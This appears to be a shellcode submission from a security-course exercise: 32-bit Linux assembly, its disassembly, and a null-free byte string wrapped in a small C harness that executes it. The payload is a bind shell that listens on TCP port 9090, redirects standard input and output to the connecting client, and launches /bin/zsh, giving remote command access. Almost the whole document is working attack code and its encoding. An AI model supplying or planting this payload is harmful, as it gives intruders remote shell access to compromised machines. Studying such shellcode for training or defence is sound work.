/*

;
; Linux x86
; Author:  thryb
; Date:    13-07-16
; Purpose: Bind /bin/zsh to TCP port 9090
; Size:    96 bytes
; ID:      SLAE-770
; Git:	   https://www.github.com/thryb/SLAE-770
;

global _start

section .text
_start:

        xor eax, eax ; cleaning registers for sanity
        xor ebx, ebx
        xor edx, edx
        xor edi, edi

        ; 1 - create socket
        ; socket(AF_INET, SOCK_STREAM, 0);
        ; #define SYS_SOCKET      1               // sys_socket(2)

        push eax ; null
        mov al, 0x66 ; sys_socketcall = 102
        mov bl, 0x1 ; socketcall() socket = 1
        push byte 0x1 ; stack = 0, 1
        push byte 0x2 ; stack = 0, 1, 2 (0, SOCK_STREAM, AF_INET)
        mov ecx, esp ; mov stack ptr to ecx
        int 0x80 ; init

        ; 2 - Bind port
        ; bind(fd, (struct sockaddr *) &s_addr, 16);
        ; #define SYS_BIND        2               // sys_bind(2)

        xchg edi, eax ; transfer fd to edi
        mov al, 0x66 ; sys_socketcall = 102
        pop ebx ; sys_bind = 2
        pop esi  ; = 1
        push edx ; stack = [0]
        push word 0x8223 ; stack = [0, port_num]
        push word bx ; stack = [0, port_num, 2]
        push byte 16 ; stack = [0, port_num, 2], 16
        push ecx ; stack = [0, port_num, 2], 16, pointer
        push edi ; stack = [0, port_num, 2], 16, *ptr, fd
        mov ecx, esp ; move stack ptr to ecx
        int 0x80 ; init

        ; 3 - Listen
        ; listen(fd, 1);
        ; #define SYS_LISTEN      4               // sys_listen(2)

        pop edx ; save fd
        mov al, 0x66 ; sys_socketcall = 102
        add bl, 0x2 ; bl + 2 (bl 2 from bind)
        int 0x80 ; init

        ; 4 - Accept
        ; accept(fd, NULL, NULL);
        ; #define SYS_ACCEPT      5               // sys_accept(2)

	push eax ; 0 - NULL
        push eax ; 0 - NULL
        mov al, 0x66 ; sys_socketcall = 102
        inc ebx ; make 5 for listen (4 from listen)
        push edx ; push fd on stack
        mov ecx, esp ; move stack ptr to ecx
        int 0x80 ; init

        ; 5 - dup
        ; sys_dup2 = 63 = 0x3f

        xchg eax, ebx   ; ebx = fd / eax = 5
        xor ecx, ecx    ; NULL ecx
        add cl, 0x2     ; add 2 to counter

        dup2: ; STDIN, STDOUT, STDERR
                mov al, 0x3f    ; sys_dup2
                int 0x80        ; init
                dec cl          ; decrement counter
                jns dup2        ; Jump on No Sign (Positive)

        ; 6 - execve /bin/zsh
        ; normal execve shell exec

        push eax
        push 0x68737a2f ; hsz/
        push 0x6e69622f ; nib/

        mov ebx, esp

        push eax
        mov edx, esp

        push ebx
        mov ecx, esp

        mov al, 0xb     ; sys_execve (11)
        int 0x80        ; init

============================================================================================================

No NULL

./bind-sh-tcp-9090:     file format elf32-i386


Disassembly of section .text:

08048060 <_start>:
 8048060:       31 c0                   xor    %eax,%eax
 8048062:       31 db                   xor    %ebx,%ebx
 8048064:       31 d2                   xor    %edx,%edx
 8048066:       31 ff                   xor    %edi,%edi
 8048068:       50                      push   %eax
 8048069:       b0 66                   mov    $0x66,%al
 804806b:       b3 01                   mov    $0x1,%bl
 804806d:       6a 01                   push   $0x1
 804806f:       6a 02                   push   $0x2
 8048071:       89 e1                   mov    %esp,%ecx
 8048073:       cd 80                   int    $0x80
 8048075:       97                      xchg   %eax,%edi
 8048076:       b0 66                   mov    $0x66,%al
 8048078:       5b                      pop    %ebx
 8048079:       5e                      pop    %esi
 804807a:       52                      push   %edx
 804807b:       66 68 23 82             pushw  $0x8223
 804807f:       66 53                   push   %bx
 8048081:       6a 10                   push   $0x10
 8048083:       51                      push   %ecx
 8048084:       57                      push   %edi
 8048085:       89 e1                   mov    %esp,%ecx
 8048087:       cd 80                   int    $0x80
 8048089:       5a                      pop    %edx
 804808a:       b0 66                   mov    $0x66,%al
 804808c:       80 c3 02                add    $0x2,%bl
 804808f:       cd 80                   int    $0x80
 8048091:       50                      push   %eax
 8048092:       50                      push   %eax
 8048093:       b0 66                   mov    $0x66,%al
 8048095:       43                      inc    %ebx
 8048096:       52                      push   %edx
 8048097:       89 e1                   mov    %esp,%ecx
 8048099:       cd 80                   int    $0x80
 804809b:       93                      xchg   %eax,%ebx
 804809c:       31 c9                   xor    %ecx,%ecx
 804809e:       80 c1 02                add    $0x2,%cl

080480a1 <dup2>:
 80480a1:       b0 3f                   mov    $0x3f,%al
 80480a3:       cd 80                   int    $0x80
 80480a5:       fe c9                   dec    %cl
 80480a7:       79 f8                   jns    80480a1 <dup2>
 80480a9:       50                      push   %eax
 80480aa:       68 2f 7a 73 68          push   $0x68737a2f
 80480af:       68 2f 62 69 6e          push   $0x6e69622f
 80480b4:       89 e3                   mov    %esp,%ebx
 80480b6:       50                      push   %eax
 80480b7:       89 e2                   mov    %esp,%edx
 80480b9:       53                      push   %ebx
 80480ba:       89 e1                   mov    %esp,%ecx
 80480bc:       b0 0b                   mov    $0xb,%al
 80480be:       cd 80                   int    $0x80


*/

#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x31\xdb\x31\xd2\x31\xff\x50\xb0\x66\xb3\x01\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x97\xb0\x66\x5b\x5e\x52\x66\x68"
// ==== Port ====
"\x23\x82"
// ==============
"\x66\x53\x6a\x10\x51\x57\x89\xe1\xcd\x80\x5a\xb0\x66\x80\xc3\x02\xcd\x80\x50\x50\xb0\x66\x43\x52\x89\xe1\xcd\x80\x93\x31\xc9\x80\xc1\x02\xb0\x3f\xcd\x80\xfe\xc9\x79\xf8\x50\x68\x2f\x7a\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}